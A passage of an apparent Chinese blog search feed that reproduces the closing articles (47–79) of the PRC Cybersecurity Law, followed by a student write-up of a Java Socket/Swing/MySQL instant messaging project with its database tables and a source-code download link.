网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十八条</strong> 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十九条</strong> 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。 网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p><strong>第五十条</strong> 国家网信部门和有关部门依法履行网络信息安全监督管理职责， 发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息， 应当通知有关机构采取技术措施和其他必要措施阻断传播。 </p><h4 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h4><p><strong>第五十一条</strong> 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。 </p><p><strong>第五十二条</strong> 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。 </p><p><strong>第五十三条</strong> 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。 </p><p><strong>第五十四条</strong> 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害， 采取下列措施： </p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测； </p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度； </p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。 </p><p><strong>第五十五条</strong> 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息</p><p><strong>第五十六条</strong> 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。 </p><p><strong>第五十七条</strong> 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有 关法律、行政法规的规定处置。 </p><p><strong>第五十八条</strong> 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。 </p><h4 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h4><p><strong>第五十九条</strong> 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。 </p><p><strong>第六十条</strong> 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危 害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款： </p><p>（一）设置恶意程序的； </p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的； </p><p>（三）擅自终止为其产品、服务提供安全维护的。 </p><p><strong>第六十一条</strong> 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十二条</strong> 违反本法第二十六条规定，开展网络安全认证、检测、风险 评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业 整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人 员和其他直接责任人员处五千元以上五万元以下罚款。 </p><p><strong>第六十三条</strong> 违反本法第二十七条规定，从事危害网络安全的活动，或者 提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。 单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。 </p><p><strong>第六十四条</strong> 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非 法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法 所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。 </p><p><strong>第六十五条</strong> 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十六条</strong> 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予 警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十七条</strong> 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 </p><p><strong>第六十八条</strong> 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的， 处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。 </p><p><strong>第六十九条</strong> 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的； </p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的； </p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。 </p><p><strong>第七十条</strong> 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。 </p><p><strong>第七十一条</strong> 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。 </p><p><strong>第七十二条</strong> 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。 </p><p><strong>第七十三条</strong> 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。 </p><p><strong>第七十四条</strong> 违反本法规定，给他人造成损害的，依法承担民事责任。违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯 罪的，依法追究刑事责任。 </p><p><strong>第七十五条</strong> 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危 害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财 产或者其他必要的制裁措施。 </p><h4 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h4><p><strong>第七十六条</strong> 本法下列用语的含义： </p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。 </p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。 </p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。 </p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。 </p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、 身份证件号码、个人生物识别信息、住址、电话号码等。 </p><p><strong>第七十七条</strong> 存储、处理涉及国家秘密信息的网络的运行安全保护，除应 当遵守本法外，还应当遵守保密法律、行政法规的规定。 </p><p><strong>第七十八条</strong> 军事网络的安全保护，由中央军事委员会另行规定。 </p><p><strong>第七十九条</strong> 本法自 2017 年 6 月 1 日起施行。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 法律法规 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java项目 即时通讯系统</title>
      <link href="/2023/03/18/Java%E5%AE%9E%E8%AE%AD/"/>
      <url>/2023/03/18/Java%E5%AE%9E%E8%AE%AD/</url>
      
        <content type="html"><![CDATA[<h2 id="即时通讯系统"><a href="#即时通讯系统" class="headerlink" title="即时通讯系统"></a>即时通讯系统</h2><h3 id="1-系统概述"><a href="#1-系统概述" class="headerlink" title="1  系统概述"></a>1  系统概述</h3><blockquote><p><font color=blue>即时通讯是一款基于互联网的即时通讯软件，旨在为企业提供高效、安全、便捷的沟通工具。</font></p><p>本项目是一个基于Java语言开发的企业QQ系统，是基于C/S模型实现。系统可分为两个部分，服务端和客户端。服务端的工作主要是来监听和接收来自客户端的请求，然后存储并处理客户端发来的消息，并通知客户端。而客户端的功能是能够让新用户注册，通过用户名密码登陆并且使用该系统。通过服务端和客户端的协同工作最终使用户能够使用该程序，完成用户和用户之间的沟通。</p></blockquote><h4 id="1-1-功能概述"><a href="#1-1-功能概述" class="headerlink" title="1.1 功能概述"></a>1.1 功能概述</h4><ol><li><p>好友管理：支持用户进行好友添加、好友删除、修改等操作，同时也支持用户自行注册、登录、修改个人信息等操作</p></li><li><p>群组管理：支持用户创建、删除、修改群组，同时也支持用户加入、退出、查看群组等操作</p></li><li><p>即时通讯：支持用户之间的即时聊天，同时也支持群组内的多人聊天，聊天内容可以包括文字、图片、文件、表情等</p></li><li><p>安全性保障：所有数据传输均采用加密方式，保证用户信息和聊天内容的安全性</p></li><li><p>消息推送：支持消息推送功能，当有新消息到达时，系统会及时向用户发送通知，方便用户及时查看聊天记录</p></li><li><p>日志记录：系统会记录用户的聊天记录以及操作日志，方便管理员进行管理和监控</p></li></ol><h4 id="1-2-技术概述"><a href="#1-2-技术概述" class="headerlink" title="1.2 技术概述"></a>1.2 技术概述</h4><p><strong>1.2.1 Java基础知识：包括语法、面向对象编程</strong></p><p>Java具有简单性、面向对象、分布式、健壮性、安全性、平台独立与可移植性、多线程、多线程、动态性等特点。Java可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等</p><p><strong>1.2.2 网络编程技术Socket</strong></p><p>在本程序中为实现客户端和服务器之间的通信，使用Socket技术，socket能够通过java程序发出请求和处理网络发过来的请求。在建立双方网络连接的时候会使用到socket套接字。当网络成功建立连接后，双方都会有一个socket的实例被建立，通过使用和操作这个实例完成各种需求。对双方的连接来说，客户端和服务端并没有什·么差别socket是平等的，它们都是通过socket的实现类和它的子类来完成的</p><p>socket分为服务端和客户端两部分，服务端主要是可以监听一个特殊的端口，它能够监听并且捕获的向这个特定的端口发出的请求，这个请求就是由客户端来发起的。当连接建立之后会产生会话，完成会话之后关闭连接。而客户端主要是发起请求，它能够向某一个特定的服务器上的一个特殊的端口发起请求，然后建立连接处理会话，会话完成后和服务端一样关闭socket。客户端并不用像服务器一样规定一个特殊的打开的端口，系统会自动分配一个能够使用的端口</p><p><strong>1.2.3 数据库java.SQL与MySQL数据库</strong></p><p>Java.SQL是Java语言中用于访问关系型数据库的API，Java.SQL API提供了一组简单易用的接口和类来访问关系型数据库，使得开发者可以方便地进行数据库操作，Java.SQL API是面向对象的，它将数据库中的数据结构映射为Java中的对象，使得开发者可以使用面向对象的方式来操作数据库，Java.SQL API支持插件式的驱动程序架构，使得开发者可以通过添加新的驱动程序来支持更多的数据库类型</p><p>MySQL是一种开源的、关系型数据库管理系统（RDBMS），它是由瑞典MySQL AB公司开发的，现在属于Oracle公司旗下产品。MySQL广泛应用于Web应用程序的开发中，是目前使用最为广泛的关系型数据库之一。其具有高性能，可扩展性、简单易用、跨平台性、可靠性，被广泛应用于各种应用程序的开发中</p><p><strong>1.2.4 前端技术java.swing与java.awt</strong></p><p>Java Swing是一组用于创建图形用户界面（GUI）的Java类库。它提供了丰富的组件和工具，可以帮助开发人员构建跨平台的GUI应用程序。ava Swing提供了许多常用的GUI组件，例如按钮、文本框、下拉列表、表格等，还提供了一些高级组件，例如树形控件、分隔面板、标签页等。Java Swing提供了多种布局管理器，例如BorderLayout、FlowLayout、GridLayout等，可以帮助开发人员快速构建复杂的GUI界面</p><p><strong>1.2.5 系统及文件流操作java.io</strong></p><p>Java的核心库java.io提供了全面的IO接口。包括：文件读写、标准设备输出等。Java中IO是以流为基础进行输入输出的，所有数据被串行化写入输出流，或者从输入流读入。支持文件输入输出、网络输入输出、内存输入输出等多种方式，可以处理各种来源的数据</p><p><strong>1.2.6 各类型数据处理java.util</strong></p><p>Java.util是Java语言中一个重要的标准库，提供了许多常用的工具类和数据结构，用于处理各种数据类型、日期、时间、集合等问题。Java.util提供了众多的数据结构，如数组、列表、队列、栈、堆、哈希表、树、图等，可以满足不同场景下的数据存储和处理需求。此外提供了Date、Calendar、DateFormat、SimpleDateFormat等类，支持日期和时间的格式化、解析、计算和比较等操作</p><p><strong>1.2.7 java.long多线程设置</strong></p><p>java.lang包中的Thread类是Java实现多线程的核心类之一。通过创建Thread对象并调用其start()方法，可以启动一个新的线程并执行其中的代码</p><p>创建了一个新的线程后，会将其作为参数传递给Thread构造函数的Runnable对象中定义的代码块作为该线程的执行内容。调用start()方法后，该线程会在后台运行并执行其中的代码。除了Thread类，java.lang包中还提供了一些其他的类和接口，如Runnable接口、ThreadGroup类等，用于实现多线程编程。通过这些类和接口，可以方便地管理和控制多个线程的执行</p><h3 id="2-系统设计"><a href="#2-系统设计" class="headerlink" title="2  系统设计"></a>2  系统设计</h3><h4 id="2-1功能设计"><a href="#2-1功能设计" class="headerlink" title="2.1功能设计"></a>2.1功能设计</h4><p>系统功能框架如图2-1所示:</p><img src="./Java实训/系统功能框架.jpg" style="zoom: 67%;" /><center>图2-1系统功能框架</center>系统使用流程如图2-1所示：<img src="./Java实训/系统使用流程.jpg" alt="img" style="zoom:67%;" /><center>图2-2系统使用流程</center>即时通讯是一款基于互联网的即时通讯系统，系统分为两个部分服务端和客户端,实现基础的注册登录、好友管理、群组管理、即时通讯、日志记录、提供安全保障功能。<p>客户端为用户提供了注册登录功能，新用户通过注册账号进入即时通讯系统，系统自动展示好友列表窗体。用户根据需求通过用户账号、用户名的搜索实现好友添加，通过查看与设置好友信息实现对好友的备注、分类与管理；用户通过群号、群名的搜索想要加入的群聊，同时用户可以选取好友创建属于自己的群聊，根据需求修改群信息实现个性化群聊。</p><p>服务端实现了三大功能，界面显示功能、业务处理功能、数据传送功能。界面显示功能通过服务端的设置把控主窗体界面显示；业务处理功能管理对应的用户线程，顺利实现用户的注册、登录与退出，依托服务器连接数据库实现聊天业务的处理，完成信息的记录与查询；数据传送功能是即时聊天系统的核心功能，实现简单信息传输的同时，支持一定大小文件与图片的传输，同时为了增加交互的趣味性，支持表情包的传输，其余功能有待开发。</p><p><strong>2.1.1 登录界面</strong></p><ol><li><p>用户登录: 对输入用户名和密码进行验证。用户输入数据，发送到指定的客户端，由客户端与其相连的数据库进行比较</p></li><li><p>注册账号: 设置用户名、昵称、手机号、所在地、年龄、性别、密码并对信息进行存储</p></li></ol><p><strong>2.1.2 主界面</strong></p><ol><li><p>好友列表: 对好友分组实现创建、修改、删除；对好友实现修改备注、查看资料、清空聊天记录、置顶聊天等功能</p></li><li><p>群组列表: 对群组实现创建、解散、修改资料等功能</p></li><li><p>其他功能: 实现用户资料修改、查找/添加群和好友、查看群/好友申请列表/修改用户密码/退出登录等功能。</p></li></ol><p><strong>2.1.3聊天界面</strong></p><ul><li>实现消息发送、图片发送、表情发送、文件发送、截图、查看聊天记录、字体设置等功能。</li></ul><h4 id="2-2数据库设计"><a href="#2-2数据库设计" class="headerlink" title="2.2数据库设计"></a>2.2数据库设计</h4><p><strong>2.2.1 实体关系设计</strong></p><p>即时通讯系统采用的是MySQL数据库，然后借助数据库可视化软MySQL workbeach 创建数据库，通过相应建表语句，最后完整的设计出系统数据库。</p><p>系统数据库表基本E-R表关系如图2-2所示。</p><p>系统数据库实体属性如图2-3、图2-4、图2-5、图2-6所示。</p><img src="./Java实训/数据库基本E-R图.jpg" style="zoom:80%;" /><center>图2-2系统E-R图</center><img src="./Java实训/用户实体.jpg" style="zoom: 80%;" /><center>图2-3用户属性图</center><img src="./Java实训/好友属性E-R图.jpg" style="zoom:80%;" /><center>图2-4好友属性图</center><img src="./Java实训/消息属性E-R图.jpg" style="zoom:67%;" /><center>图2-5消息记录属性图</center><img src="./Java实训/群属性E-R图.jpg" style="zoom:80%;" /><center>图2-6群属性图</center>**2.2.2表**<p>以下列出数据库设计过程中相关表的情况。</p><ol><li>yonghu用户信息表 :该表主要用于存储注册用户的个人账号信息，主要由账号密码、性别、年龄、昵称、电话、地址、注册日期等字段组成，其表结构如表2-1所示。</li></ol><center>表2-1 yonghu表的结构</center>|   字段名   | 数据类型 | 长度 | 是否主键 |   描述   || :--------: | :------: | ---- | :------: | :------: || yonghuming | varchar  | 200  |    是    |  用户名  ||    mima    | varchar  | 200  |    否    |   密码   ||  xingbie   | varchar  | 200  |    否    |   性别   ||  nianling  | varchar  | 200  |    否    |   年龄   ||   aihao    | varchar  | 200  |    否    |   爱好   ||    role    | varchar  | 200  |    否    |   角色   ||  nicheng   | varchar  | 200  |    否    |   昵称   ||   phone    | varchar  | 200  |    否    |   电话   ||  address   | varchar  | 200  |    否    |   地址   ||  headimg   | varchar  | 200  |    否    |   头像   || registdate | varchar  | 200  |    否    | 注册日期 |<ol start="2"><li>haoyou好友表 :该表主要用于存储用户的好友信息并记录是否置顶，好友信息主要由好友名、好友备注、昵称、归属组ID组成，其表结构主要如表2-2所示。</li></ol><center>表2-2 haoyou表的结构</center>| 字段名           | 数据类型 | 长度 | 是否主键 | 描述       || :--------------- | :------: | :--: | :------: | :--------- || id               | varchar  | 200  |    是    | 好友ID     || haoyouyonghuming | varchar  | 200  |    否    | 好友用户名 || beizhuname       | varchar  | 200  |    否    | 备注名称   || nickname         | varchar  | 200  |    否    | 昵称       || zhiding          | varchar  | 200  |    否    | 是否置顶   || fenleiid         |   int    |  10  |    否    | 归属组ID   |<ol start="3"><li>qun 群组表 :该表主要记录创建的群的群号、群名、群主、群备注以及群头像，其表结构主要如表2-3所示</li></ol><center>表2-3 qun表的结构</center>| 字段名  | 数据类型 | 长度 | 是否主键 |  描述  || :-----: | :------: | :--: | :------: | :----: || qunhao  | varchar  | 200  |    是    |  群号  || qunming | varchar  | 200  |    否    |  群名  || qunzhu  | varchar  | 200  |    否    |  群主  ||  note   | varchar  | 200  |    否    |  备注  || headimg | varchar  | 200  |    否    | 群头像 |<ol start="4"><li>qunyonghu 群用户表 :该表主要记录群用户ID、用户名，以及归属群的群号，其表结构主要如表2-4所示。</li></ol><center>表2-4 qunyonghu表的结构</center>| 字段名     | 数据类型 | 长度 | 是否主键 | 描述     || ---------- | -------- | ---- | -------- | -------- || id         | varchar  | 200  | 是       | 群用户ID || qunhao     | varchar  | 200  | 否       | 归属群号 || yonghuming | varchar  | 200  | 否       | 用户名   |<ol start="5"><li>xiaoxijilu 消息记录表 :该表主要是消息记录流，记录消息的发送方、接收方、类型、内容、大小，其表结构主要如表2-5所示</li></ol><center>表2-5 xiaoxijilu表的结构</center>| 字段名        | 数据类型 | 长度 | 是否主键 | 描述     || ------------- | -------- | ---- | -------- | -------- || id            | varchar  | 200  | 是       | 编号     || fasongren     | varchar  | 200  | 否       | 发送方   || jieshouren    | varchar  | 200  | 否       | 接收方   || neirong       | varchar  | 200  | 否       | 消息内容 || leixing       | varchar  | 200  | 否       | 消息类型 || fasongshijian | varchar  | 200  | 否       | 发送时间 || size          | varchar  | 200  | 否       | 消息大小 |<ol start="6"><li>fenlei :该表主要记录用户的所属分组，主要包括用户名、归属分组名、归属分组的ID，其表结构主要如表2-6所示</li></ol><center>表2-6 fenlei表的结构</center>| 字段名    | 数据类型 | 长度 | 是否主键 |   描述   || --------- | :------: | :--: | :------: | :------: || id        |   int    |  10  |    是    |    ID    || parentid  |   int    |  10  |    否    | 归属组ID || mingcheng | varchar  | 200  |    否    |   组名   || username  | varchar  | 200  |    否    |  用户名  |<ol start="7"><li>qiandao :该表用于记录用户的上线日期，其表结构主要如表2-7所示</li></ol><center>表2-7 qiandao表的结构</center>|   字段名    | 数据类型 | 长度 | 是否主键 |   描述   || :---------: | :------: | :--: | :------: | :------: ||     id      | varchar  | 200  |    是    |    ID    || qiandaoren  | varchar  | 200  |    否    |  用户名  || qiandaoriqi | varchar  | 200  |    否    | 上线日期 |<h3 id="3-系统实现"><a href="#3-系统实现" class="headerlink" title="3  系统实现"></a>3  系统实现</h3><h4 id="3-1登录界面"><a href="#3-1登录界面" class="headerlink" title="3.1登录界面"></a>3.1登录界面</h4><p><strong>3.1.1用户登录</strong></p><p>用户登录界面如图3-1所示。</p><img src="./Java实训/用户登录界面.png"  /><center>图3-1用户登录界面图</center>页面由swing代码设计完成，通过swing的addMouseListener鼠标点击触发器，检测各功能的使用，当用户按下登录初始化一个消息对象，Message msg=new Message(textField.getText());并指定消息对象的类型为connect，并将消息发送给客户端，并开启线程监听服务器端发送信息。<p>在服务器端有Server.Task用于处理客户端发送的各种消息，当检查到消息类型为connect，进入登录审查，检查数据库签到表，如果表项不为空，说明当前账户已经在其他设备登录，返回该用户已登录信息，防之存储用户名对应的ip 端口，并查询数据库用户表项用户是否存在和密码是否正确。</p><p>如果账户密码匹配成功则返回信息，登录成功，反之返回登录失败，客户端会通过线程监听服务器返回的信息作出相应的反馈。</p><p><strong>3.1.2注册账号</strong></p><p>注册账号界面如图3-2所示。</p><img src="./Java实训/账号注册页面.png" style="zoom:67%;" /><center>图3-2注册账号界面图</center>与登录流程类似，当用户点击注册按钮，会初始化一个消息对象，消息对象的类型字段为regist，并通过java.sql将数据存储到用户表上，此外与登录页面类似<p>另外的，在上传头像上使用java.io库中的getSelectedFile函数，在本地计算机中选取图像与头像，头像的传输与其在数据库的存储则是这一项目中较为困难的点，我们在用户表中设有headimg用于经过计算得到的存储32位的头像散列，并将其一流的形式发到对应服务器的headimg中，在用户登录时也是对应将这里的数据流发送给客户端</p><h4 id="3-2主界面"><a href="#3-2主界面" class="headerlink" title="3.2主界面"></a>3.2主界面</h4><p>即时通讯系统主界面如图3-3所示。</p><img src="./Java实训/即时通讯系统主界面.png"  /><center>图3-3主界面</center>**3.2.1好友列表**<p>分组创建功能实现如图3-4所示，修改好友备注功能实现如图3-5所示。</p><img src="./Java实训/创建图片.png" style="zoom:80%;" /><center>图3-4分组创建</center><img src="./Java实训/修改备注.png"  /><center>图3-5修改备注</center>**3.2.2群组列表**<p>创建群功能实现如图3-6所示。</p><img src="./Java实训/群聊功能实现.jpg"  /><center>图3-6群创建</center>**3.2.3其他功能**<p>添加好友功能实现如图3-7所示，添加群聊功能实现如图3-8所示，好友申请列表如图3-9所示</p><img src="./Java实训/添加好友功能实现.png" style="zoom:80%;" /><center>图3-7添加好友</center><img src="./Java实训/入群申请.png" style="zoom:80%;" /><center>图3-8申请入群</center><img src="./Java实训/好友申请列表.png"  /><center>图3-9好友申请列表</center>#### 3.3聊天界面<p>私聊聊天界面如图3-10所示，群聊聊天界面如图3-11所示</p><img src="./Java实训/私聊界面.png" style="zoom:80%;" /><center>图3-10 私聊聊天界面</center>本项目作为一个模仿QQ设计的即时通讯软件，私聊与群聊毫无疑问是程序的核心，在聊天的功能基础上我们受课程原始项目启发，实现了原有项目未能实现的字体设计，图片发送与文件发送，及表情包。表情包的本质实际为预先存储于程序文件夹下的图片与图片传输没有本质区别，在两个客户端均省去了，使用java.io库中程序寻找文件和，发送文件流的过程。<p>截图功能作为老师所提供项目本就实现的功能，在原有基础上没有做太大改动。文件传输与图片传输与用户注册或修改用户信息时头像的传输方式类似，都是同msg流实现文件在网络中传输，发送的数据会记录到数据库中，而接受放客户端在接受到想用信息后会将msg流存储与/msg文件夹下，实现了信息的本地存储。</p><h4 id="3-4数据存储实现"><a href="#3-4数据存储实现" class="headerlink" title="3.4数据存储实现"></a>3.4数据存储实现</h4><p>数据存储结果如图3-12</p><img src="./Java实训/数据存储结果.jpg" style="zoom:80%;" /><center>图3-12 数据存储结果</center>**在数据库的实现过程中具体操作如下：**<ol><li><p>获取数据库连接：使用getConnection方法加载MySQL数据库驱动程序”jdbc:mysql://“+ip+”:3306/“+ dbname +”?characterEncoding=utf-8”, username, password,并通过getConnection()方法建立数据库连接</p></li><li><p>在代码中实现创建数据库和数据表，比如createStatement().execute()方法执行创建数据库命令及getConn() .createStatement().executeUpdate()方法实现数据表创建</p></li><li><p>对建立的数据库连接进行测试Connection对象的createStatement()方法创建Statement对象，使用Statement对象执行SQL语句，通过executeQuery()方法执行查询语句</p></li><li><p>创建对象，使用userService.save()实现将各种所需数据数据记录进数据表中</p></li></ol><h3 id="4-结论"><a href="#4-结论" class="headerlink" title="4  结论"></a>4  结论</h3><p>本项目是一个基于Java的企业QQ系统，实现了用户注册、登录、添加好友、聊天等基本功能。能够完成用户日常交流的需要。</p><p>通过本项目的实践，我们深入理解了Java语言和相关技术的应用，掌握了Swing、Java SQL、Java.util、MySQL、多线程等技术的使用，提高了自己的编码能力和项目开发经验。同时，本项目也为企业内部沟通和协作提供了一种新的方式，具有一定的实际应用价值。</p><h3 id="5-源代码"><a href="#5-源代码" class="headerlink" title="5 源代码"></a>5 源代码</h3><p>怎么说呢，在实训过程中找代码学习是非常麻烦的，这里我就直接放部分找到的材料源代码的百度网盘吧……</p><blockquote><p><font color=orange>链接：<a href="https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m">https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m</a> </font ><br><font color=orange>提取码：pv7m </font></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通信原理思考题</title>
      <link href="/2023/03/09/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E9%A2%98/"/>
      <url>/2023/03/09/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E9%A2%98/</url>
      
